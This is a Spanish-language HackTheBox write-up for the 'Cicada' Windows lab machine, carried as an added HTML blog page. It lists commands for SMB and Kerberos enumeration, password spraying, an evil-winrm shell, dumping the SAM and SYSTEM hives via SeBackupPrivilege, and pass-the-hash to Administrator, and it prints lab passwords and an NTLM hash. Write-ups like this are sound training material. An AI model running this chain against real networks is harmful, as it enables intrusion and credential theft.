@@ -1,0 +1,366 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+  <title>
+  Cicada Machine - HackTheBox · Celero0 Blog
+</title>
+  <meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="color-scheme" content="light dark">
+
+
+
+
+<meta name="author" content="CeleroRKX">
+<meta name="description" content="Esta es una máquina Windows nivel fácil de la plataforma HackTheBox">
+<meta name="keywords" content="blog,developer,personal">
+
+
+
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:title" content="Cicada Machine - HackTheBox">
+  <meta name="twitter:description" content="Esta es una máquina Windows nivel fácil de la plataforma HackTheBox">
+
+<meta property="og:url" content="https://celero0.github.io/posts/cicada/">
+  <meta property="og:site_name" content="Celero0 Blog">
+  <meta property="og:title" content="Cicada Machine - HackTheBox">
+  <meta property="og:description" content="Esta es una máquina Windows nivel fácil de la plataforma HackTheBox">
+  <meta property="og:locale" content="en_us">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="posts">
+    <meta property="article:published_time" content="2026-01-06T00:34:02+00:00">
+    <meta property="article:modified_time" content="2026-01-06T00:34:02+00:00">
+
+
+
+
+<link rel="canonical" href="https://celero0.github.io/posts/cicada/">
+
+
+<link rel="preload" href="/fonts/fa-brands-400.woff2" as="font" type="font/woff2" crossorigin>
+<link rel="preload" href="/fonts/fa-regular-400.woff2" as="font" type="font/woff2" crossorigin>
+<link rel="preload" href="/fonts/fa-solid-900.woff2" as="font" type="font/woff2" crossorigin>
+
+
+  
+  
+  <link rel="stylesheet" href="/css/coder.min.4b392a85107b91dbdabc528edf014a6ab1a30cd44cafcd5325c8efe796794fca.css" integrity="sha256-SzkqhRB7kdvavFKO3wFKarGjDNRMr81TJcjv55Z5T8o=" crossorigin="anonymous" media="screen" />
+
+
+
+
+
+
+  
+    
+    
+    <link rel="stylesheet" href="/css/coder-dark.min.a00e6364bacbc8266ad1cc81230774a1397198f8cfb7bcba29b7d6fcb54ce57f.css" integrity="sha256-oA5jZLrLyCZq0cyBIwd0oTlxmPjPt7y6KbfW/LVM5X8=" crossorigin="anonymous" media="screen" />
+  
+
+
+
+ 
+
+
+
+
+<link rel="icon" type="image/svg+xml" href="/img/favicon.svg" sizes="any">
+<link rel="icon" type="image/png" href="/img/favicon-32x32.png" sizes="32x32">
+<link rel="icon" type="image/png" href="/img/favicon-16x16.png" sizes="16x16">
+
+<link rel="apple-touch-icon" href="/images/apple-touch-icon.png">
+<link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+
+<link rel="manifest" href="/site.webmanifest">
+<link rel="mask-icon" href="/images/safari-pinned-tab.svg" color="#5bbad5">
+
+
+
+
+
+
+
+
+
+</head>
+
+
+
+
+
+
+<body class="preload-transitions colorscheme-auto">
+  
+<div class="float-container">
+    <a id="dark-mode-toggle" class="colorscheme-toggle">
+        <i class="fa-solid fa-adjust fa-fw" aria-hidden="true"></i>
+    </a>
+</div>
+
+
+  <main class="wrapper">
+    <nav class="navigation">
+  <section class="container">
+    
+    <a class="navigation-title" href="https://celero0.github.io/">
+      Celero0 Blog
+    </a>
+    
+    
+      <input type="checkbox" id="menu-toggle" />
+      <label class="menu-button float-right" for="menu-toggle">
+        <i class="fa-solid fa-bars fa-fw" aria-hidden="true"></i>
+      </label>
+      <ul class="navigation-list">
+        
+          
+            <li class="navigation-item">
+              <a class="navigation-link " href="/posts/">Writeups</a>
+            </li>
+          
+            <li class="navigation-item">
+              <a class="navigation-link " href="/about/">About</a>
+            </li>
+          
+        
+        
+      </ul>
+    
+  </section>
+</nav>
+
+
+    <div class="content">
+      
+  <section class="container post">
+    <article>
+      <header>
+        <div class="post-title">
+          <h1 class="title">
+            <a class="title-link" href="https://celero0.github.io/posts/cicada/">
+              Cicada Machine - HackTheBox
+            </a>
+          </h1>
+        </div>
+        <div class="post-meta">
+          <div class="date">
+            <span class="posted-on">
+              <i class="fa-solid fa-calendar" aria-hidden="true"></i>
+              <time datetime="2026-01-06T00:34:02Z">
+                January 6, 2026
+              </time>
+            </span>
+            <span class="reading-time">
+              <i class="fa-solid fa-clock" aria-hidden="true"></i>
+              4-minute read
+            </span>
+          </div>
+          
+          
+          
+        </div>
+      </header>
+
+      <div class="post-content">
+        
+        <hr>
+<ul>
+<li>Tags: #Machine #Windows #Easy</li>
+</ul>
+<hr>
+<p>Partimos realizando un escaneo de los puertos abiertos de la máquina víctima de la siguiente forma.</p>
+<p><strong>Comando:</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>nmap -p- --open -sS -vvv --min-rate <span style="color:#a5d6ff">5000</span> -n -Pn 10.10.11.35 -oG allPorts
+</span></span></code></pre></div><img src="/images/Pasted image 20250319233239.png" style="width:100%; height:auto; display:block; margin:auto;">
+<p>Luego analizamos los puerto que fueron reportados de la siguiente forma:</p>
+<p><strong>Comando:</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>nmap -p53,88,135,139,389,445,464,593,636,3268,3269,5985,61330 -sCV 10.10.11.35
+</span></span></code></pre></div><p>Dándonos como información relevante el dominio: cicada.htb y CICADA-DC.cicada.htb</p>
+<p>añadimos cicada.htb al /etc/hosts</p>
+<img src="/images/Pasted image 20250319234500.png" style="width:100%; height:auto; display:block; margin:auto;">
+<p>Como tenemos el #Port88 (kerberos-sec) abierto, podemos realizar un ataque de fuerza bruta con kerbrute para realizar enumeración de usuarios válidos, con el siguiente comando:</p>
+<p><em>Comando:</em></p>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>kerbrute_linux_amd64 userenum -d cicada.htb --dc 10.10.11.35 /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt
+</span></span></code></pre></div><p>Obteniendo dos usuarios válidos:
+<img src="/images/Pasted image 20250320003045.png" style="width:100%; height:auto; display:block; margin:auto;"></p>
+<p>Como tenemos usuarios podemos probarlos para ver recursos compartidos por SMB, ya que este servicio se encontraba abierto por el #Port445 (Defecto).</p>
+<p>Primeramente analizamos usuario y contraseñas nulas de las siguiente manera:</p>
+<p><strong>Comando:</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>netexec smb 10.10.11.35 -u <span style="color:#a5d6ff">&#39;&#39;</span> -p <span style="color:#a5d6ff">&#39;&#39;</span> --shares
+</span></span></code></pre></div><p>A lo cual no encontramos ninguna carpeta compartida, como enumeramos dos usuarios, probaremos con el usuario &ldquo;guest&rdquo; y contraseña nula de la siguiente forma:</p>
+<p><strong>Comando:</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>netexec smb 10.10.11.35 -u <span style="color:#a5d6ff">&#39;guest&#39;</span> -p <span style="color:#a5d6ff">&#39;&#39;</span> --shares
+</span></span></code></pre></div><p>Obtenemos varios recursos compartidos, de los cuales tenemos permiso de lectura para dos:</p>
+<img src="/images/Pasted image 20250320003817.png" style="width:100%; height:auto; display:block; margin:auto;">
+<p>Listaremos el recurso HR conectandonos con smbclient y el usuario guest de la siguiente forma</p>
+<p><strong>Comando:</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>smbclient <span style="color:#79c0ff">\\\\</span>10.10.11.35<span style="color:#79c0ff">\\</span>HR -U <span style="color:#a5d6ff">&#39;cicada.htb\guest%&#39;</span>
+</span></span></code></pre></div><p>para descargar todos los archivos de manera recursiva y analizarlos en local podemos realizar los siguientes comandos dentro de la interfaz smb:</p>
+<p><strong>Comando:</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>mask <span style="color:#a5d6ff">&#34;&#34;</span>
+</span></span><span style="display:flex;"><span>prompt off
+</span></span><span style="display:flex;"><span>recurse on
+</span></span><span style="display:flex;"><span>mget *
+</span></span></code></pre></div><img src="/images/Pasted image 20250320004828.png" style="width:100%; height:auto; display:block; margin:auto;">
+<p>Obtuvimos el archivo &ldquo;&lsquo;Notice from HR.txt&rsquo;&rdquo; el cual lo leemos y encontramos una contraseña por defecto: Cicada$M6Corpb*@Lp#nZp!8</p>
+<img src="/images/Pasted image 20250320004933.png" style="width:100%; height:auto; display:block; margin:auto;">
+<p>La almacenaremos en un archivo creado llamado pass</p>
+<p>Como tenemos un usuario válido y su contraseña ( user: guest , pass: null) podemos seguir enumerando usuarios con el siguiente comando:</p>
+<p><strong>Comando:</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>impacket-lookupsid <span style="color:#a5d6ff">&#39;guest&#39;</span>@cicada.htb -no-pass
+</span></span></code></pre></div><p>Nota: -no-pass es igual a contraseña nula</p>
+<p>Obtenemos un output bastante grande:</p>
+<img src="/images/Pasted image 20250320005956.png" style="width:100%; height:auto; display:block; margin:auto;">
+<p>Pero a nosotros solo nos interesa los usuarios, que están justo al lado de SidTypeUser, por lo tanto filtraremos ese campo, y guardaremos los usuarios en un archivo llamado users.txt</p>
+<p><strong>Comando:</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>impacket-lookupsid <span style="color:#a5d6ff">&#39;cicada.htb/guest&#39;</span>@cicada.htb -no-pass | grep <span style="color:#a5d6ff">&#39;SidTypeUser&#39;</span> | sed <span style="color:#a5d6ff">&#39;s/.*\\\(.*\) (SidTypeUser)/\1/&#39;</span> &gt; users.txt
+</span></span></code></pre></div><p>Obteniendo una lista grande de usuarios:</p>
+<img src="/images/Pasted image 20250320010228.png" style="width:100%; height:auto; display:block; margin:auto;">
+<p>Ahora con nuevos usuarios y una posible contraseña válida podemos intentar comprobar las credenciales con netexec de la siguiente forma:</p>
+<p><strong>Comando:</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>netexec smb 10.10.11.35 -u users.txt -p pass --continue-on-success
+</span></span></code></pre></div><img src="/images/Pasted image 20250320010538.png" style="width:100%; height:auto; display:block; margin:auto;">
+<p>Teniendo como resultado que el usuario michael.wrightson y la contraseña Cicada$M6Corpb*@Lp#nZp!8 son válidas, por tanto volvemos a listar los recursos compartidos con las credenciales obtenidas:</p>
+<p><strong>Comando:</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>netexec smb 10.10.11.35 -u <span style="color:#a5d6ff">&#39;michael.wrightson&#39;</span> -p <span style="color:#a5d6ff">&#39;Cicada$M6Corpb*@Lp#nZp!8&#39;</span> --shares
+</span></span></code></pre></div><p>obtenemos nuevos recursos pero dentro de ellos no hay nada interesante, por lo tanto enumeraremos nuevos usuarios y veremos si tienen alguna nota interesante:</p>
+<p><strong>Comando:</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>crackmapexec smb cicada.htb -u michael.wrightson -p <span style="color:#a5d6ff">&#39;Cicada$M6Corpb*@Lp#nZp!8&#39;</span> --users
+</span></span></code></pre></div><p>Obteniendo una posible contraseña válida <code>aRt$Lp#7t*VQ!3</code> para el usuario david.orelious :</p>
+<img src="/images/Pasted image 20250320011522.png" style="width:100%; height:auto; display:block; margin:auto;">
+<p>Agregamos la contraseña a pass, y verificamos los recursos compartidos con las nuevas credenciales:</p>
+<p><strong>Comando:</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>netexec smb 10.10.11.35 -u <span style="color:#a5d6ff">&#39;david.orelious&#39;</span> -p <span style="color:#a5d6ff">&#39;aRt$Lp#7t*VQ!3&#39;</span> --shares
+</span></span></code></pre></div><img src="/images/Pasted image 20250320014626.png" style="width:100%; height:auto; display:block; margin:auto;">
+<p>Entramos a DEV:</p>
+<p><strong>Comando:</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>smbclient <span style="color:#79c0ff">\\\\</span>10.10.11.35<span style="color:#79c0ff">\\</span>DEV -U <span style="color:#a5d6ff">&#39;david.orelious%aRt$Lp#7t*VQ!3&#39;</span>
+</span></span></code></pre></div><p>Descargamos todos los archivos de forma recursiva, obteniendo un archivo Backup_script.ps1 el cual contiene una contraseña en texto plano <code>Q!3@Lp#M6b*7t*Vt</code> que será agregada a nuestro archivo pass</p>
+<img src="/images/Pasted image 20250320014929.png" style="width:100%; height:auto; display:block; margin:auto;">
+<p>Probamos la contraseña con nuestra lista de usuarios creadas</p>
+<p><strong>Comando:</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>netexec smb 10.10.11.35 -u users.txt -p <span style="color:#a5d6ff">&#39;Q!3@Lp#M6b*7t*Vt&#39;</span> --continue-on-success
+</span></span></code></pre></div><p>y obtenemos unas nuevas credenciales válidas:</p>
+<img src="/images/Pasted image 20250320015305.png" style="width:100%; height:auto; display:block; margin:auto;">
+<p>El usuario: <code>emily.oscars</code>  y la contraseña: <code>Q!3@Lp#M6b*7t*Vt</code></p>
+<p>Ahora listaremos los recursos compartidos para las nuevas credenciales:</p>
+<p><strong>Comando:</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>netexec smb 10.10.11.35 -u <span style="color:#a5d6ff">&#39;emily.oscars&#39;</span> -p <span style="color:#a5d6ff">&#39;Q!3@Lp#M6b*7t*Vt&#39;</span> --shares
+</span></span></code></pre></div><img src="/images/Pasted image 20250320020023.png" style="width:100%; height:auto; display:block; margin:auto;">
+<p>Como vemos que el recurso C$ tiene permisos de lectura y escritura podemos utilizar el script evil-winrm para darnos una shell interactiva con el siguiente comando:</p>
+<p><strong>Comando:</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>evil-winrm -u emily.oscars -p <span style="color:#a5d6ff">&#39;Q!3@Lp#M6b*7t*Vt&#39;</span> -i cicada.htb
+</span></span></code></pre></div><p>A lo cual obtenemos acceso a la máquina víctima windows, y navegando un poco en los directorios encontramos la flag de usuario, en la ruta: C:\Users\emily.oscars.CICADA\Desktop</p>
+<p>Ahora nuestro foco es la escalada de privilegios para eso verificamos que privilegios tenemos con el usuario actual utilizando el siguiente comando:
+<strong>Comando:</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>whoami /priv 
+</span></span></code></pre></div><img src="/images/Pasted image 20250320020752.png" style="width:100%; height:auto; display:block; margin:auto;">
+<p>Encontramos que tenemos el privilegio SeBackupPrivilege habilitado, el cual es tipico para cuentas administradoras o servicios que deban realizar backups, por lo cual puede acceder a información sensible, lo cual puede derivar a una escalada de privilegios de la siguiente manera</p>
+<p>La  SAM (Administrador de Cuentas de Seguridad) contiene información de las cuentas de usuario locales y la pertenencia a grupos, incluyendo sus contraseñas cifradas.
+La sección SYSTEM contiene la configuración general del sistema, como la clave de arranque del sistema necesaria para descifrar los hashes de contraseñas almacenados en SAM.</p>
+<p>Con los siguientes comandos podemos copiar el sam y el system</p>
+<p><strong>Comando:</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>reg save hklm<span style="color:#79c0ff">\s</span>am sam
+</span></span><span style="display:flex;"><span>reg save hklm<span style="color:#79c0ff">\s</span>ystem system
+</span></span></code></pre></div><p>Posteriormente podemos descargar los archivos hacia nuestra máquina local</p>
+<p><strong>Comando:</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>download sam
+</span></span><span style="display:flex;"><span>download system
+</span></span></code></pre></div><p>con impacket-secretsdump podemos utilizar la sam y system para dumpear los hashes ntlm de la siguiente manera:</p>
+<p><strong>Comando:</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>impacket-secretsdump -sam sam -system system local
+</span></span></code></pre></div><p>Teniendo como resultado lo siguiente, de lo cual nos interesa la parte de <code>2b87e7c93a3e8a0ea4a581937016f341</code>:</p>
+<img src="/images/Pasted image 20250320021756.png" style="width:100%; height:auto; display:block; margin:auto;">
+<p>Ahora con evil-winrm y con el hash que obtuvimos nos podemos conectar como administrador, y así obtener de manera exitosa la escalada de privilegios</p>
+<p><strong>Comando:</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>evil-winrm -u Administrator -H 2b87e7c93a3e8a0ea4a581937016f341 -i cicada.htb
+</span></span></code></pre></div><p>y así finalmente pwneamos la máquina víctima.</p>
+<img src="/images/Pasted image 20250320022035.png" style="width:100%; height:auto; display:block; margin:auto;">
+
+      </div>
+
+
+      <footer>
+        
+
+
+        
+        
+        
+        
+        
+        
+        
+      </footer>
+    </article>
+
+    
+  </section>
+
+    </div>
+
+    <footer class="footer">
+  <section class="container">
+    ©
+    
+      2019 -
+    
+    2026
+     CeleroRKX 
+    ·
+    
+    Powered by <a href="https://gohugo.io/" target="_blank" rel="noopener">Hugo</a> & <a href="https://github.com/luizdepra/hugo-coder/" target="_blank" rel="noopener">Coder</a>.
+    
+  </section>
+</footer>
+
+  </main>
+
+  
+
+  
+  
+  <script src="/js/coder.min.6ae284be93d2d19dad1f02b0039508d9aab3180a12a06dcc71b0b0ef7825a317.js" integrity="sha256-auKEvpPS0Z2tHwKwA5UI2aqzGAoSoG3McbCw73gloxc="></script>
+  
+
+  
+
+  
+
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+</body>
+</html>
